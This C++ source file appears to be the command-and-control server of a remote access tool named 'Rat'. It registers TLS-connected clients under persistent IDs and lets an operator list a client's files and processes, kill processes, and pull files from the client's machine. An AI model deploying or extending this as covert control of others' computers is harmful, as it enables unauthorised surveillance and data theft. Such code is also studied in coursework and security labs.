#include "Server.hpp"
#include "Utils.hpp"
#include <iostream>
#include <thread>
#include <random>
#include <fstream>
#include <iomanip>
#include <sstream>
#include <openssl/evp.h>

namespace Rat 
{

    std::string md5HashString(const std::string& input) 
    {
        unsigned char md_value[EVP_MAX_MD_SIZE];
        unsigned int md_len = 0;
        EVP_MD_CTX* mdctx = EVP_MD_CTX_new();
        EVP_DigestInit_ex(mdctx, EVP_md5(), nullptr);
        EVP_DigestUpdate(mdctx, input.data(), input.size());
        EVP_DigestFinal_ex(mdctx, md_value, &md_len);
        EVP_MD_CTX_free(mdctx);
        std::stringstream ss;
        for (unsigned int i = 0; i < md_len; ++i)
            ss << std::hex << std::setw(2) << std::setfill('0') << (int)md_value[i];
        return ss.str();
    }

    std::string generateRandomData(size_t length) 
    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(33, 126);
        std::string data;
        for (size_t i = 0; i < length; ++i) {
            data += static_cast<char>(dis(gen));
        }
        return data;
    }

    Server::Server(uint16_t port)
        : networkManager_(), acceptor_(networkManager_.get_io_context(), boost::asio::ip::tcp::endpoint(boost::asio::ip::tcp::v4(), port))
        
    {
        networkManager_.setup_ssl_context_server("server.crt", "server.key", "ca.crt", "dh2048.pem");
        // networkManager_.setup_ssl_context(true, "./server.crt", "./server.key", "./ca.crt");
    }

    Server::~Server() 
    {
        stop();
    }

    void Server::start() 
    {
        initListClientID();
        acceptConnections();
        input_thread_ = std::thread(&Server::handleUserInput, this);
        networkManager_.get_io_context().run();
    }

    void Server::stop() 
    {
        networkManager_.get_io_context().stop();
        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            clients_.clear();
        }
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            client_id_.clear();
        }
        if (input_thread_.joinable()) input_thread_.join();
    }

    void Server::initListClientID(const std::string& path) 
    {
        std::fstream file(path, std::ios::in | std::ios::out | std::ios::app);
        if (!file.is_open()) 
        {
            std::cout << "Cannot open file: " << path << "\n";
            return;
        }
        std::string client_id;
        while (std::getline(file, client_id)) 
        {
            try 
            {
                client_id_.insert(std::stol(client_id));
            } 
            catch (const std::exception& e) 
            {
                // std::cout << "Invalid ID: " << e.what() << "\n";
            }
        }
        file.close();
    }

    void Server::acceptConnections() 
    {
        auto socket = std::make_shared<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>>(
            networkManager_.get_io_context(), networkManager_.get_ssl_context());

        acceptor_.async_accept(socket->lowest_layer(),
            [this, socket](const boost::system::error_code& ec) {
                if (!ec) {
                    // socket->set_verify_mode(boost::asio::ssl::verify_peer);
                    socket->async_handshake(boost::asio::ssl::stream_base::server,
                        [this, socket](const boost::system::error_code& ec) {
                            if (!ec) {
                                std::cout << "New client connected: " << socket->lowest_layer().remote_endpoint().address().to_string() << "\n";
                                handleClient(socket);
                            } else {
                                std::cout << "Handshake error: " << ec.message() << "\n";
                            }
                            boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                            // acceptConnections();
                        });
                } else {
                    std::cout << "Accept error: " << ec.message() << "\n";
                    boost::asio::post(networkManager_.get_io_context(), [this]() { acceptConnections(); });
                    // acceptConnections();
                }
            });
    }

    
    void Server::handleClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) {
        networkManager_.receive(client,
            [this, client](const rat::Packet& packet, const boost::system::error_code& ec) 
            {

                if (ec) 
                {
                    std::cout << "Client error: " << ec.message() << "\n";
                    client->lowest_layer().close();
                    removeClient(client);
                    return;
                }
                if (packet.has_chunked_data()) 
                {
                    
                    switch (packet.type())
                    {
                        case rat::Packet::STATIC_ID:
                        {
                            
                            uint64_t source_id = parseStaticIdPayload(packet.chunked_data().payload());
                            if (client_id_.find(source_id) != client_id_.end()) 
                            {   
                                updateClientWithExistingId(client, source_id);
                                // std::cout << "Debug update: " << source_id << std::endl;
                            } 
                            else 
                            {
                                assignNewClientId(client, source_id);
                                saveClientIdsToFile(source_id);
                                // std::cout << "Debug assign: " << source_id << std::endl;
                            }
                            
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
                            break;
                        }
                        case rat::Packet::TRANSFER_FILE:
                        {
                            // std::cout << "TRANSFER FILE TYPE FROM SERVER: "  << packet.type() << std::endl;
                            // std::cout << "TRANSFER FILE PAYLOAD FROM SERVER: " << packet.chunked_data().sequence_number() + 1 << " / "
                            //         << packet.chunked_data().total_chunks() << " = "
                            //         << (packet.chunked_data().sequence_number() + 1) / float(packet.chunked_data().total_chunks()) * 100 << "%" << std::endl;
                            uint64_t client_id;
                            std::string ip_id;
                            {
                                std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                auto client_it = clients_.find(client);
                                if (client_it == clients_.end()) {
                                    std::cerr << "[" << std::time(nullptr) << "] Unknown client sending TRANSFER_FILE\n";
                                    break;
                                }
                                client_id = client_it->second;
                                ip_id = client->lowest_layer().remote_endpoint().address().to_string();
                            }
                            auto receiver_it = file_receivers_.find(client_id);
                            if (receiver_it == file_receivers_.end()) {
                                // std::string file_path = "received_" + Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + ".txt";
                                std::string file_path = Utils::sanitizeFileName(packet.chunked_data().data_id()) + "_" + std::to_string(client_id) + Utils::getFileName(packet.file_path());
                                std::string filename = Utils::getFileName(packet.file_path());
                                auto receiver = std::make_shared<FileReceiver>(
                                    client, networkManager_, file_path, packet.chunked_data().data_id(), client_id,
                                    [this, client_id, client]() {
                                        // std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                        
                                        // auto it = file_receivers_.find(client_id);
                                        // if (it != file_receivers_.end()) {
                                        //     file_receivers_.erase(it);
                                        //     std::cout << "[" << std::time(nullptr) << "] FileReceiver removed for client " << client_id << "\n";
                                        // }

                                        // boost::asio::post(networkManager_.get_io_context(), [this, client]() {
                                        //     handleClient(client);
                                        // });
                                        {
                                            std::lock_guard<std::mutex> lock(file_receivers_mutex_);
                                            file_receivers_.erase(client_id);
                                        }
                                
                                        handleClient(client);
                                    }, 
                                    [this, client_id, ip_id, filename](uint64_t sequence_number, uint64_t total_chunks) {
                                        ServerGUI::displayProgress(client_id, ip_id, filename, sequence_number, total_chunks);
                                    });

                                
                                file_receivers_[client_id] = receiver;
                                receiver->startReceiving(packet);
                            } else {
                                receiver_it->second->startReceiving(packet);
                            }

                            return; // FileReceiver sẽ tiếp tục xử lý các gói tiếp theo
                        }
                        case rat::Packet::LIST_FILES_FOLDERS:
                        {   
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); }); 
                            break; 
                        }
                        case rat::Packet::LIST_PROCESSES:
                        {    
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
                            break;
                        }
                        default:
                        {
                            boost::asio::post(networkManager_.get_io_context(), [this, client]() { handleClient(client); });
                            break;
                        }
                    }                    
                }
                
            });
    }

    void Server::sendCommandToClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, const rat::Packet& packet) 
    {
        networkManager_.send(client, packet, [](const boost::system::error_code& ec) 
        {
            if (ec) std::cout << "Send error: " << ec.message() << "\n";
        });
    }

    void Server::handleUserInput() 
    {
        std::string input;
        std::cout << "Enter packet type (LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS): ";
        while (std::getline(std::cin, input)) 
        {

            std::vector<std::string> list_commands = Utils::handleCommand(input);
            // std::cout << "Debug size: " << list_commands.size() << std::endl;
            // for(auto x: list_commands) {std::cout << x << std::endl;}
            if(list_commands.size() == 3)
            {
                std::string command = list_commands[0];
                std::string object = list_commands[1];
                std::string argument = list_commands[2];
                // argument = "/home/quang/Downloads/ubuntu.iso";
                uint64_t object_id = parseStaticIdPayload(object);
                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);
                // O(n) => optimizer in the furture 
                if(!socket_client) continue;
                if (command == "transfer_file")
                {
                    // std::cout << "Debug transfer_file argument: " << argument << std::endl;
                    rat::Packet packet_transfer_file;
                    packet_transfer_file.set_type(rat::Packet::TRANSFER_FILE);
                    packet_transfer_file.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
                    packet_transfer_file.set_source_id("server_0");
                    packet_transfer_file.set_destination_id("client_" + std::to_string(object_id));
                    packet_transfer_file.set_encrypted(true);
                    packet_transfer_file.set_file_path(argument);
                    auto* chunked = packet_transfer_file.mutable_chunked_data();
                    chunked->set_data_id("TRANSFER_FILE" + std::to_string(std::rand()));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    // std::cout << "debug packet transfer: " << packet_transfer_file.file_path() << std::endl;
                    networkManager_.send(socket_client, packet_transfer_file, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
            }
            else if (list_commands.size() == 1)
            {
                std::string command = list_commands[0];
                if (command == "list_files_folders") 
                {
                    std::cout << "server send: " << command << std::endl;
                    rat::Packet packet;
                    packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
                    packet.set_packet_id("client_all_" + std::to_string(std::rand()));
                    packet.set_source_id("server_0");
                    packet.set_destination_id("client_all");
                    packet.set_encrypted(true);
                    packet.set_file_path("");
                    auto* chunked = packet.mutable_chunked_data();
                    chunked->set_data_id("LIST_FILES_FOLDERS" + std::to_string(std::rand()));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    for (auto& client : clients_) 
                    {
                        sendCommandToClient(client.first, packet);
                    }
                }
            }
            else if (list_commands.size() == 2)
            {
                std::string command = list_commands[0];
                std::string object = list_commands[1];

                uint64_t object_id = parseStaticIdPayload(object);
                std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> socket_client = Utils::getSocketFromId(clients_, object_id);

                if(!socket_client) continue;
                if (command == "list_files_folders")
                {
                    rat::Packet packet_list_files_folders;
                    packet_list_files_folders.set_type(rat::Packet::LIST_FILES_FOLDERS);
                    packet_list_files_folders.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
                    packet_list_files_folders.set_source_id("server_0");
                    packet_list_files_folders.set_destination_id("client_" + std::to_string(object_id));
                    packet_list_files_folders.set_encrypted(true);
                    
                    auto* chunked = packet_list_files_folders.mutable_chunked_data();
                    chunked->set_data_id("LIST_FILES_FOLDERS" + std::to_string(std::rand()));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_list_files_folders, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else if(command == "list_processes")
                {
                    rat::Packet packet_list_processes;
                    packet_list_processes.set_type(rat::Packet::LIST_PROCESSES);
                    packet_list_processes.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
                    packet_list_processes.set_source_id("server_0");
                    packet_list_processes.set_destination_id("client_" + std::to_string(object_id));
                    packet_list_processes.set_encrypted(true);
                    
                    auto* chunked = packet_list_processes.mutable_chunked_data();
                    chunked->set_data_id("LIST_PROCESSES" + std::to_string(std::rand()));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_list_processes, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
                else if (command == "kill_process")
                {
                    rat::Packet packet_kill_process;
                    packet_kill_process.set_type(rat::Packet::KILL_PROCESS);
                    packet_kill_process.set_packet_id("client_" + std::to_string(object_id) + "_" + std::to_string(std::rand()));
                    packet_kill_process.set_source_id("server_0");
                    packet_kill_process.set_destination_id("client_" + std::to_string(object_id));
                    packet_kill_process.set_encrypted(true);
                    
                    auto* chunked = packet_kill_process.mutable_chunked_data();
                    chunked->set_data_id("KILL_PROCESS" + std::to_string(std::rand()));
                    chunked->set_sequence_number(0);
                    chunked->set_total_chunks(1);
                    chunked->set_payload(command);
                    chunked->set_success(true);
                    networkManager_.send(socket_client, packet_kill_process, [](const boost::system::error_code& ec) 
                    {
                        if (ec) std::cout << "Send error: " << ec.message() << "\n";
                    });
                }
            }
            continue;
            /// 
            // if (input == "list_clients") 
            // {
            //     ServerGUI::displayClients(clients_);
            //     continue;
            // }
            // rat::Packet packet;
            // packet.set_packet_id("server_" + std::to_string(std::rand()));
            // packet.set_source_id("server");
            // packet.set_destination_id("all_clients");

            // if (input == "list_files") 
            // {
            //     packet.set_type(rat::Packet::LIST_FILES_FOLDERS);
            // } 
            // else if (input == "list_processes") 
            // {
            //     packet.set_type(rat::Packet::LIST_PROCESSES);
            // } 
            // else if (input == "read_file") 
            // {
            //     packet.set_type(rat::Packet::READ_FILE);
            // } 
            // else if (input == "kill_process") 
            // {
            //     packet.set_type(rat::Packet::KILL_PROCESS);
            // } 
            // else 
            // {
            //     std::cout << "Unknown type, use: LIST_FILES_FOLDERS, LIST_PROCESSES, READ_FILE, KILL_PROCESS\n";
            //     std::cout << "Enter packet type: ";
            //     continue;
            // }

            // auto* chunked = packet.mutable_chunked_data();
            // chunked->set_payload(input);

            // for (auto& client : clients_) 
            // {
            //     sendCommandToClient(client.first, packet);
            // }
            // std::cout << "Server sent: Type=" << input << ", Data=" << chunked->payload() << "\n";
            // std::cout << "Enter packet type: ";
        }
    }

    void Server::addClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t client_id) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.size() >= MAX_CLIENT) 
        {
            std::cout << "Error: Maximum client limit reached!\n";
            if (client) client->lowest_layer().close();
            return;
        }
        clients_[client] = client_id;
        // clients_.insert({client, client_id});
    }

    void Server::removeClient(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        clients_.erase(client);
    }

    uint64_t Server::parseStaticIdPayload(const std::string& payload) 
    {
        try 
        {
            return std::stol(payload);
        } 
        catch (const std::exception& e) 
        {
            // std::cout << "Invalid number: " << e.what() << "\n";
            return -1;
        }
    }

    void Server::updateClientWithExistingId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t source_id) 
    {
        std::lock_guard<std::mutex> lock(client_mutex_);
        if (clients_.find(client) != clients_.end()) 
        {
            std::cout << "Client is existing, update ID: " << source_id << "\n";
            clients_[client] = source_id;
        } 
        else 
        {
            // clients_.insert({client, source_id});
            clients_[client] = source_id;
        }
    }

    void Server::assignNewClientId(std::shared_ptr<boost::asio::ssl::stream<boost::asio::ip::tcp::socket>> client, uint64_t& source_id) 
    {
        {
            std::lock_guard<std::mutex> lock(client_id_mutex_);
            source_id = client_id_.empty() ? 0 : *client_id_.rbegin() + 1;
            client_id_.insert(source_id);
        }

        rat::Packet response;
        response.set_type(rat::Packet::STATIC_ID);
        response.set_packet_id("server_0_" + std::to_string(std::rand()));
        response.set_source_id("server_0");
        response.set_destination_id("client_" + std::to_string(source_id));
        response.set_encrypted(true);
        auto* chunked = response.mutable_chunked_data();
        chunked->set_data_id("STATIC_ID_" + std::to_string(std::rand()));
        chunked->set_sequence_number(0);
        chunked->set_total_chunks(1);
        chunked->set_payload(std::to_string(source_id));
        chunked->set_success(true);

        sendCommandToClient(client, response);
        {
            std::lock_guard<std::mutex> lock(client_mutex_);
            // std::cout << "Debug: " << source_id << std::endl;
            // std::cout << "Debug set clients before insert: ";
            for(auto x: clients_) { std::cout << x.first << "-" << x.second << std::endl;}
            // clients_.insert({client, source_id});
            clients_[client] = source_id;
            // std::cout << "Debug set clients after insert: ";
            for(auto x: clients_) {std::cout << x.first << "-" << x.second << std::endl;}
        }
    }

    void Server::saveClientIdsToFile(const uint64_t& source_id, const std::string& path) 
    {
        boost::asio::post(networkManager_.get_io_context(), [this, source_id, path]() 
        {
            std::lock_guard<std::mutex> lock(file_save_mutex_);
            std::ofstream file(path, std::ios::app);
            if (!file.is_open()) 
            {
                std::cout << "Cannot open file: " << path << "\n";
                return;
            }
            file << source_id << "\n";
            file.close();
        });
    }

} // namespace Rat